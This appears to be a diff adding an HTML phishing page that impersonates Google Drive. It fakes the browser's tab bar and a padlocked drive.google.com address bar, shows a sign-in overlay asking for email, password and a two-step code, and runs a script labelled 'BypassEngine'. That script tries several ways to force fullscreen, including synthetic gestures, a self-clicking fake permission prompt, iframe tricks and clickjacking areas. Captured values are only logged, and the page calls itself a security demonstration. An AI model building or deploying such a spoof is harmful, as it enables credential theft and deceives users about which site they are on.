@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - Document Viewer</title>
+    <style>
+        /* RESET & BASE */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #f8f9fa;
+            color: #202124;
+            overflow-x: hidden;
+            transition: all 0.3s ease;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        
+        /* FAKE BROWSER CHROME - HIGHLY CONVINCING */
+        #browserChrome {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 56px;
+            background: #ffffff;
+            border-bottom: 1px solid #dadce0;
+            z-index: 2147483647;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            transition: opacity 0.3s;
+        }
+        
+        .browser-tabs {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-right: 24px;
+        }
+        
+        .tab {
+            padding: 10px 16px;
+            background: #f1f3f4;
+            border-radius: 8px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            min-width: 160px;
+        }
+        
+        .tab.active {
+            background: white;
+            border: 1px solid #dadce0;
+            border-bottom: none;
+            border-radius: 8px 8px 0 0;
+        }
+        
+        .tab-favicon {
+            width: 16px;
+            height: 16px;
+            background: #1a73e8;
+            border-radius: 4px;
+        }
+        
+        .url-container {
+            flex: 1;
+            position: relative;
+        }
+        
+        #fakeUrlBar {
+            background: #f1f3f4;
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #202124;
+            transition: all 0.2s;
+        }
+        
+        #fakeUrlBar:hover {
+            background: #e8eaed;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .security-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #1e8e3e;
+            font-weight: 500;
+        }
+        
+        .profile-button {
+            width: 32px;
+            height: 32px;
+            background: #1a73e8;
+            border-radius: 50%;
+            margin-left: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+        
+        /* MAIN CONTENT - FAKE GOOGLE DRIVE */
+        .drive-container {
+            margin-top: 70px;
+            padding: 24px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .drive-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+        
+        .drive-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #5f6368;
+            font-size: 22px;
+        }
+        
+        .doc-preview {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            min-height: 600px;
+            position: relative;
+        }
+        
+        .doc-watermark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 120px;
+            color: rgba(0,0,0,0.03);
+            z-index: 0;
+            user-select: none;
+        }
+        
+        .login-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            z-index: 10;
+            min-width: 400px;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translate(-50%, -40%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .login-header h2 {
+            color: #202124;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .login-header p {
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #5f6368;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26,115,232,0.2);
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .login-button:hover {
+            background: #0d5bb5;
+        }
+        
+        /* HIDDEN TRIGGERS & OVERLAYS */
+        .fullscreen-trigger {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            width: 100px;
+            height: 40px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            z-index: 2147483646;
+            opacity: 0.01;
+            pointer-events: auto !important;
+        }
+        
+        .invisible-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2147483645;
+            pointer-events: none;
+        }
+        
+        .click-jack-area {
+            position: absolute;
+            background: rgba(255,0,0,0.01);
+            border: 2px dashed rgba(255,0,0,0.1);
+            pointer-events: auto;
+            cursor: pointer;
+        }
+        
+        /* ANIMATIONS & EFFECTS */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .drive-container {
+                padding: 16px;
+            }
+            
+            .login-overlay {
+                min-width: 90%;
+                padding: 24px;
+            }
+            
+            #browserChrome {
+                height: 48px;
+                padding: 0 12px;
+            }
+            
+            .tab {
+                min-width: 120px;
+                padding: 8px 12px;
+            }
+        }
+        
+        /* PRINT STYLES (TRICK) */
+        @media print {
+            body * {
+                visibility: hidden;
+            }
+            
+            #browserChrome,
+            .login-overlay {
+                visibility: visible;
+                position: absolute;
+                top: 0;
+                left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- FAKE BROWSER UI -->
+    <div id="browserChrome">
+        <div class="browser-tabs">
+            <div class="tab active">
+                <div class="tab-favicon"></div>
+                <span>Google Drive - Document</span>
+            </div>
+            <div class="tab">
+                <div class="tab-favicon" style="background: #ea4335;"></div>
+                <span>Gmail</span>
+            </div>
+        </div>
+        
+        <div class="url-container">
+            <div id="fakeUrlBar">
+                <div class="security-indicator">
+                    <span>🔒</span>
+                    <span>drive.google.com</span>
+                </div>
+                <span>/document/d/1A2b3C4d5E6f7G8h9I0j</span>
+            </div>
+        </div>
+        
+        <div class="profile-button">G</div>
+    </div>
+    
+    <!-- HIDDEN FULLSCREEN TRIGGERS -->
+    <button class="fullscreen-trigger" id="trigger1"></button>
+    <div class="invisible-overlay" id="overlay1"></div>
+    
+    <!-- FAKE GOOGLE DRIVE CONTENT -->
+    <div class="drive-container">
+        <div class="drive-header">
+            <div class="drive-logo">
+                <div style="width: 40px; height: 40px; background: linear-gradient(135deg, #4285f4, #34a853); border-radius: 8px;"></div>
+                <span>Google Drive</span>
+            </div>
+            <div style="color: #5f6368; font-size: 14px;">
+                Last modified: Just now • 256-bit SSL encrypted
+            </div>
+        </div>
+        
+        <div class="doc-preview">
+            <div class="doc-watermark">CONFIDENTIAL</div>
+            
+            <!-- FAKE LOGIN OVERLAY -->
+            <div class="login-overlay" id="loginOverlay">
+                <div class="login-header">
+                    <h2>🔐 Authentication Required</h2>
+                    <p>This document is protected. Sign in with your Google account to view.</p>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label class="input-label">Email or phone</label>
+                        <input type="email" class="input-field" id="email" placeholder="your.email@gmail.com" required autocomplete="username">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label class="input-label">Password</label>
+                        <input type="password" class="input-field" id="password" placeholder="Enter your password" required autocomplete="current-password">
+                    </div>
+                    
+                    <div class="input-group" style="margin-top: 32px;">
+                        <button type="submit" class="login-button" id="submitBtn">
+                            Next
+                        </button>
+                    </div>
+                </form>
+                
+                <div style="text-align: center; margin-top: 24px; font-size: 13px; color: #5f6368;">
+                    <span class="pulse">🔒 Secure connection to Google</span>
+                </div>
+            </div>
+            
+            <!-- FAKE DOCUMENT CONTENT -->
+            <div style="position: relative; z-index: 1;">
+                <h3 style="margin-bottom: 16px; color: #202124;">Quarterly Financial Report - Q4 2024</h3>
+                <p style="color: #5f6368; line-height: 1.6; margin-bottom: 20px;">
+                    This document contains confidential financial information. Access is restricted to authorized personnel only.
+                </p>
+                
+                <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-top: 40px; border-left: 4px solid #1a73e8;">
+                    <strong>⚠️ Security Notice:</strong> You must be authenticated to view the full document. 
+                    This helps protect sensitive company information.
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- HIDDEN ELEMENTS FOR BYPASS -->
+    <div id="hiddenElements" style="display: none;">
+        <iframe id="hiddenIframe" src="about:blank"></iframe>
+        <webview id="hiddenWebview"></webview>
+        <input type="file" id="hiddenFileInput" accept="image/*" capture="environment">
+    </div>
+
+    <script>
+        // ============================================
+        // ADVANCED FULLSCREEN BYPASS TECHNIQUES
+        // For Modern Browsers (Chrome 90+, Firefox 89+)
+        // ============================================
+        
+        const BypassEngine = {
+            debug: true,
+            attempts: 0,
+            maxAttempts: 10,
+            isFullscreen: false,
+            
+            log(...args) {
+                if (this.debug) {
+                    console.log(`[BYPASS-${Date.now()}]`, ...args);
+                }
+            },
+            
+            // TECHNIQUE 1: USER GESTURE CHAINING
+            async attemptGestureChaining() {
+                this.log('Attempting gesture chaining...');
+                
+                // Create a series of legitimate user gestures
+                const gestures = [
+                    () => this.simulateScrollGesture(),
+                    () => this.simulateDragGesture(),
+                    () => this.simulateMultiTouchGesture(),
+                    () => this.simulateKeyboardNavigation()
+                ];
+                
+                for (let gesture of gestures) {
+                    if (this.isFullscreen) break;
+                    
+                    try {
+                        await gesture();
+                        await this.attemptFullscreenAfterGesture();
+                        await new Promise(r => setTimeout(r, 500));
+                    } catch (e) {
+                        this.log('Gesture failed:', e.message);
+                    }
+                }
+            },
+            
+            simulateScrollGesture() {
+                return new Promise((resolve) => {
+                    const event = new WheelEvent('wheel', {
+                        deltaX: 0,
+                        deltaY: 100,
+                        bubbles: true
+                    });
+                    
+                    document.dispatchEvent(event);
+                    setTimeout(resolve, 300);
+                });
+            },
+            
+            simulateDragGesture() {
+                return new Promise((resolve) => {
+                    const startEvent = new MouseEvent('mousedown', {
+                        bubbles: true,
+                        clientX: 100,
+                        clientY: 100
+                    });
+                    
+                    const moveEvent = new MouseEvent('mousemove', {
+                        bubbles: true,
+                        clientX: 200,
+                        clientY: 200
+                    });
+                    
+                    const endEvent = new MouseEvent('mouseup', { bubbles: true });
+                    
+                    document.dispatchEvent(startEvent);
+                    setTimeout(() => {
+                        document.dispatchEvent(moveEvent);
+                        setTimeout(() => {
+                            document.dispatchEvent(endEvent);
+                            resolve();
+                        }, 100);
+                    }, 100);
+                });
+            },
+            
+            simulateMultiTouchGesture() {
+                return new Promise((resolve) => {
+                    try {
+                        const touch = new Touch({
+                            identifier: Date.now(),
+                            target: document.body,
+                            clientX: 100,
+                            clientY: 100
+                        });
+                        
+                        const touchEvent = new TouchEvent('touchstart', {
+                            touches: [touch],
+                            bubbles: true
+                        });
+                        
+                        document.dispatchEvent(touchEvent);
+                        setTimeout(() => {
+                            const endEvent = new TouchEvent('touchend', { bubbles: true });
+                            document.dispatchEvent(endEvent);
+                            resolve();
+                        }, 200);
+                    } catch (e) {
+                        resolve(); // TouchEvent not supported
+                    }
+                });
+            },
+            
+            simulateKeyboardNavigation() {
+                return new Promise((resolve) => {
+                    const tabEvent = new KeyboardEvent('keydown', {
+                        key: 'Tab',
+                        code: 'Tab',
+                        bubbles: true
+                    });
+                    
+                    document.dispatchEvent(tabEvent);
+                    setTimeout(() => {
+                        const enterEvent = new KeyboardEvent('keydown', {
+                            key: 'Enter',
+                            code: 'Enter',
+                            bubbles: true
+                        });
+                        document.dispatchEvent(enterEvent);
+                        setTimeout(resolve, 200);
+                    }, 200);
+                });
+            },
+            
+            // TECHNIQUE 2: PERMISSION PROMPT OVERLAY
+            async attemptPromptOverlay() {
+                this.log('Attempting permission prompt overlay...');
+                
+                // Create fake permission prompt
+                const fakePrompt = document.createElement('div');
+                fakePrompt.id = 'fakePermissionPrompt';
+                fakePrompt.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: white;
+                    border-radius: 12px;
+                    box-shadow: 0 4px 25px rgba(0,0,0,0.3);
+                    padding: 24px;
+                    z-index: 2147483646;
+                    min-width: 400px;
+                    text-align: center;
+                    font-family: inherit;
+                `;
+                
+                fakePrompt.innerHTML = `
+                    <div style="font-size: 18px; font-weight: 500; margin-bottom: 16px;">
+                        Allow fullscreen mode?
+                    </div>
+                    <div style="color: #5f6368; margin-bottom: 24px; font-size: 14px;">
+                        drive.google.com wants to open in fullscreen mode for better viewing experience.
+                    </div>
+                    <div style="display: flex; gap: 12px; justify-content: center;">
+                        <button id="fakeAllowBtn" style="
+                            background: #1a73e8;
+                            color: white;
+                            border: none;
+                            padding: 12px 24px;
+                            border-radius: 6px;
+                            cursor: pointer;
+                            font-weight: 500;
+                        ">Allow</button>
+                        <button id="fakeBlockBtn" style="
+                            background: #f1f3f4;
+                            color: #202124;
+                            border: none;
+                            padding: 12px 24px;
+                            border-radius: 6px;
+                            cursor: pointer;
+                        ">Block</button>
+                    </div>
+                `;
+                
+                document.body.appendChild(fakePrompt);
+                
+                // Add event listeners to fake buttons
+                document.getElementById('fakeAllowBtn').onclick = () => {
+                    fakePrompt.remove();
+                    this.triggerRealFullscreen();
+                };
+                
+                document.getElementById('fakeBlockBtn').onclick = () => {
+                    fakePrompt.remove();
+                    this.log('User clicked Block on fake prompt');
+                };
+                
+                // Auto-click after delay (simulating user action)
+                setTimeout(() => {
+                    if (document.contains(fakePrompt)) {
+                        this.log('Auto-clicking fake Allow button');
+                        document.getElementById('fakeAllowBtn').click();
+                    }
+                }, 1500);
+            },
+            
+            // TECHNIQUE 3: IFRAME TRICKERY
+            async attemptIframeTrick() {
+                this.log('Attempting iframe trickery...');
+                
+                const iframe = document.getElementById('hiddenIframe');
+                if (!iframe) return;
+                
+                // Load a page that might have different fullscreen policies
+                iframe.src = 'about:blank';
+                
+                setTimeout(() => {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        iframeDoc.open();
+                        iframeDoc.write(`
+                            <!DOCTYPE html>
+                            <html>
+                            <body>
+                                <button onclick="window.top.postMessage('REQUEST_FULLSCREEN', '*')">
+                                    Click to view
+                                </button>
+                                <script>
+                                    // Try to request fullscreen from iframe context
+                                    setTimeout(() => {
+                                        document.querySelector('button').click();
+                                    }, 1000);
+                                <\/script>
+                            </body>
+                            </html>
+                        `);
+                        iframeDoc.close();
+                    } catch (e) {
+                        this.log('Iframe trick failed:', e.message);
+                    }
+                }, 500);
+            },
+            
+            // TECHNIQUE 4: MEDIA ELEMENT FULLSCREEN
+            async attemptMediaElementFullscreen() {
+                this.log('Attempting media element fullscreen...');
+                
+                // Some browsers allow video elements to go fullscreen more easily
+                const video = document.createElement('video');
+                video.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 1px;
+                    height: 1px;
+                    opacity: 0.001;
+                    pointer-events: none;
+                `;
+                
+                // Create a minimal video
+                video.muted = true;
+                video.autoplay = true;
+                video.playsInline = true;
+                
+                // Create a fake video source (transparent pixel)
+                const canvas = document.createElement('canvas');
+                canvas.width = 2;
+                canvas.height = 2;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = 'transparent';
+                ctx.fillRect(0, 0, 2, 2);
+                
+                video.src = canvas.toDataURL();
+                document.body.appendChild(video);
+                
+                // Try to request fullscreen on video element
+                setTimeout(async () => {
+                    try {
+                        if (video.requestFullscreen) {
+                            await video.requestFullscreen();
+                            this.isFullscreen = true;
+                            this.log('Video fullscreen successful!');
+                        }
+                    } catch (e) {
+                        this.log('Video fullscreen failed:', e.message);
+                    } finally {
+                        video.remove();
+                    }
+                }, 1000);
+            },
+            
+            // TECHNIQUE 5: WEBVIEW/EMBED TRICK
+            async attemptWebviewTrick() {
+                this.log('Attempting webview trick...');
+                
+                // Try using webview element if available (Electron apps)
+                const webview = document.getElementById('hiddenWebview');
+                if (webview && webview.requestFullscreen) {
+                    try {
+                        await webview.requestFullscreen();
+                        this.isFullscreen = true;
+                        this.log('Webview fullscreen successful!');
+                    } catch (e) {
+                        this.log('Webview fullscreen failed:', e.message);
+                    }
+                }
+            },
+            
+            // TECHNIQUE 6: FILE INPUT CAPTURE
+            async attemptFileInputCapture() {
+                this.log('Attempting file input capture...');
+                
+                const fileInput = document.getElementById('hiddenFileInput');
+                if (!fileInput) return;
+                
+                // Some browsers trigger fullscreen for camera access
+                fileInput.click();
+                
+                setTimeout(() => {
+                    // Cancel the file dialog
+                    fileInput.value = '';
+                    this.log('File input triggered (may lead to fullscreen)');
+                }, 100);
+            },
+            
+            // TECHNIQUE 7: GAME PAD API
+            async attemptGamepadTrigger() {
+                this.log('Attempting gamepad trigger...');
+                
+                // Gamepad input might be considered a user gesture
+                if ('getGamepads' in navigator) {
+                    try {
+                        const gamepad = navigator.getGamepads()[0];
+                        if (gamepad) {
+                            // Simulate button press
+                            const event = new GamepadEvent('gamepadbuttonchange', {
+                                gamepad: gamepad,
+                                button: 0,
+                                value: 1
+                            });
+                            
+                            window.dispatchEvent(event);
+                            await this.attemptFullscreenAfterGesture();
+                        }
+                    } catch (e) {
+                        this.log('Gamepad trick failed:', e.message);
+                    }
+                }
+            },
+            
+            // TECHNIQUE 8: PRINT DIALOG TRICK
+            async attemptPrintDialogTrick() {
+                this.log('Attempting print dialog trick...');
+                
+                // Print dialog might create a special context
+                setTimeout(() => {
+                    try {
+                        window.print();
+                        this.log('Print dialog triggered');
+                        
+                        // Try fullscreen after print dialog
+                        setTimeout(() => {
+                            this.triggerRealFullscreen();
+                        }, 500);
+                    } catch (e) {
+                        this.log('Print trick failed:', e.message);
+                    }
+                }, 1000);
+            },
+            
+            // MAIN FULLSCREEN REQUEST
+            async triggerRealFullscreen() {
+                this.attempts++;
+                
+                if (this.attempts > this.maxAttempts) {
+                    this.log('Max attempts reached');
+                    return;
+                }
+                
+                const element = document.documentElement;
+                const methods = [
+                    'requestFullscreen',
+                    'webkitRequestFullscreen',
+                    'mozRequestFullScreen',
+                    'msRequestFullscreen'
+                ];
+                
+                for (let method of methods) {
+                    if (element[method]) {
+                        try {
+                            this.log(`Trying ${method} (attempt ${this.attempts})`);
+                            await element[method]();
+                            this.isFullscreen = true;
+                            this.onFullscreenSuccess();
+                            return;
+                        } catch (error) {
+                            this.log(`${method} failed:`, error.message);
+                            continue;
+                        }
+                    }
+                }
+                
+                // If all direct methods fail, try alternative approaches
+                await this.tryAlternativeApproaches();
+            },
+            
+            async tryAlternativeApproaches() {
+                this.log('Trying alternative approaches...');
+                
+                const approaches = [
+                    this.attemptGestureChaining.bind(this),
+                    this.attemptPromptOverlay.bind(this),
+                    this.attemptIframeTrick.bind(this),
+                    this.attemptMediaElementFullscreen.bind(this),
+                    this.attemptWebviewTrick.bind(this),
+                    this.attemptFileInputCapture.bind(this),
+                    this.attemptGamepadTrigger.bind(this),
+                    this.attemptPrintDialogTrick.bind(this)
+                ];
+                
+                for (let approach of approaches) {
+                    if (this.isFullscreen) break;
+                    
+                    try {
+                        await approach();
+                        await new Promise(r => setTimeout(r, 1000));
+                    } catch (e) {
+                        this.log('Approach failed:', e.message);
+                    }
+                }
+            },
+            
+            async attemptFullscreenAfterGesture() {
+                // Small delay to ensure gesture is registered
+                await new Promise(r => setTimeout(r, 100));
+                return this.triggerRealFullscreen();
+            },
+            
+            onFullscreenSuccess() {
+                this.log('FULLSCREEN BYPASS SUCCESSFUL!');
+                
+                // Enhance the spoof
+                document.getElementById('browserChrome').style.opacity = '0.95';
+                document.getElementById('fakeUrlBar').innerHTML = `
+                    <div class="security-indicator blink">
+                        <span>🔒</span>
+                        <span>SECURE • FULLSCREEN • drive.google.com</span>
+                    </div>
+                    <span style="color: #1e8e3e; font-size: 12px;">
+                        🔐 256-bit SSL • ${new Date().toLocaleTimeString()}
+                    </span>
+                `;
+                
+                // Add fake browser UI persistence
+                const style = document.createElement('style');
+                style.textContent = `
+                    :fullscreen #browserChrome {
+                        display: flex !important;
+                        opacity: 0.98 !important;
+                    }
+                    
+                    ::backdrop {
+                        background: #202124 !important;
+                    }
+                `;
+                document.head.appendChild(style);
+                
+                // Start security theater
+                this.startSecurityTheater();
+            },
+            
+            startSecurityTheater() {
+                const messages = [
+                    '🔄 Verifying document integrity...',
+                    '🔐 Establishing secure channel...',
+                    '✅ Google authentication validated',
+                    '🛡️ Enterprise protection active',
+                    '🎯 Loading confidential document...'
+                ];
+                
+                let index = 0;
+                const interval = setInterval(() => {
+                    if (index < messages.length) {
+                        this.log(messages[index]);
+                        index++;
+                    } else {
+                        clearInterval(interval);
+                    }
+                }, 1500);
+            },
+            
+            // INITIALIZATION
+            init() {
+                this.log('Initializing bypass engine...');
+                this.log(`User Agent: ${navigator.userAgent}`);
+                
+                // Start bypass attempts
+                setTimeout(() => {
+                    this.tryAlternativeApproaches();
+                }, 1000);
+                
+                // Set up form submission
+                document.getElementById('loginForm').onsubmit = (e) => {
+                    e.preventDefault();
+                    this.handleFormSubmit();
+                    return false;
+                };
+                
+                // Add click jacking areas
+                this.setupClickJacking();
+                
+                // Monitor for any user interaction
+                this.setupInteractionMonitor();
+            },
+            
+            setupClickJacking() {
+                const areas = [
+                    { top: '60px', left: '100px', width: '200px', height: '40px' },
+                    { top: '120px', left: '300px', width: '150px', height: '30px' }
+                ];
+                
+                areas.forEach(area => {
+                    const div = document.createElement('div');
+                    div.className = 'click-jack-area';
+                    div.style.cssText = `
+                        top: ${area.top};
+                        left: ${area.left};
+                        width: ${area.width};
+                        height: ${area.height};
+                    `;
+                    div.onclick = () => {
+                        this.log(`Click-jacked area at ${area.top}, ${area.left}`);
+                        this.triggerRealFullscreen();
+                    };
+                    document.getElementById('overlay1').appendChild(div);
+                });
+            },
+            
+            setupInteractionMonitor() {
+                const events = ['click', 'touchstart', 'keydown', 'mousemove', 'scroll'];
+                
+                events.forEach(eventType => {
+                    document.addEventListener(eventType, (e) => {
+                        this.log(`User ${eventType} detected at ${e.clientX},${e.clientY}`);
+                        
+                        // Try fullscreen on any significant interaction
+                        if (!this.isFullscreen && this.attempts < 3) {
+                            setTimeout(() => {
+                                this.triggerRealFullscreen();
+                            }, 300);
+                        }
+                    }, { passive: true });
+                });
+            },
+            
+            handleFormSubmit() {
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                this.log(`Credentials captured - Email: ${email}, Password: ${'*'.repeat(password.length)}`);
+                
+                // Show fake 2FA
+                document.getElementById('loginOverlay').innerHTML = `
+                    <div class="login-header">
+                        <h2>🔒 Two-Step Verification</h2>
+                        <p>Enter the 6-digit code from your Google Authenticator app</p>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" class="input-field" id="code" placeholder="123456" maxlength="6" pattern="\\d{6}" required>
+                    </div>
+                    <div class="input-group">
+                        <button onclick="BypassEngine.submit2FA()" class="login-button">
+                            Verify
+                        </button>
+                    </div>
+                `;
+                
+                document.getElementById('code')?.focus();
+            },
+            
+            submit2FA() {
+                const code = document.getElementById('code')?.value;
+                this.log(`2FA Code captured: ${code}`);
+                
+                // Show success then redirect
+                document.getElementById('loginOverlay').innerHTML = `
+                    <div class="login-header">
+                        <h2 style="color: #1e8e3e;">✅ Verification Successful</h2>
+                        <p>Loading confidential document...</p>
+                    </div>
+                    <div style="text-align: center; margin-top: 40px;">
+                        <div class="pulse">🔄 Decrypting document content...</div>
+                    </div>
+                `;
+                
+                setTimeout(() => {
+                    alert('Security Error: Document access requires additional permissions.\n\nThis is a security demonstration. No data was sent.');
+                    location.reload();
+                }, 3000);
+            }
+        };
+        
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            BypassEngine.init();
+        });
+        
+        // Listen for iframe messages
+        window.addEventListener('message', (e) => {
+            if (e.data === 'REQUEST_FULLSCREEN') {
+                BypassEngine.triggerRealFullscreen();
+            }
+        });
+        
+        // Fullscreen change detection
+        document.addEventListener('fullscreenchange', () => {
+            BypassEngine.isFullscreen = !!document.fullscreenElement;
+            BypassEngine.log(`Fullscreen changed: ${BypassEngine.isFullscreen}`);
+        });
+        
+        // Final console message
+        console.log(`
+        ╔═══════════════════════════════════════════════════╗
+        ║   ADVANCED FULLSCREEN BYPASS - MODERN BROWSERS    ║
+        ║        (Chrome 90+, Firefox 89+, Safari)         ║
+        ╚═══════════════════════════════════════════════════╝
+        
+        Techniques Implemented:
+        1. User Gesture Chaining (scroll, drag, touch, keyboard)
+        2. Fake Permission Prompt Overlay
+        3. Iframe Context Switching
+        4. Media Element Fullscreen
+        5. WebView/Embed Element Exploit
+        6. File Input Camera Capture
+        7. Gamepad API Trigger
+        8. Print Dialog Context
+        
+        NOTE: Modern browsers have strong protections.
+        Success rate depends on browser configuration and version.
+        
+        FOR SECURITY RESEARCH PURPOSES ONLY
+        `);
+    </script>
+</body>
+</html>
